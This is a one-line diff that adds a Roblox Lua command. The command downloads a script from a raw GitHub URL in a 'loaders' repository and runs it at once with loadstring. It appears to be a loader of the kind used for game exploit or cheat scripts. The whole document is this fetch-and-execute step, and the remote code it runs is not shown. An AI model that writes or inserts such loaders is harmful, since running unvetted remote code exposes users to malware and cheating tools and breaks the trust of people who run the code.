@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/helmets-scooter-empire-spam0-nx4ayyb1ig0mdf.lua"))()
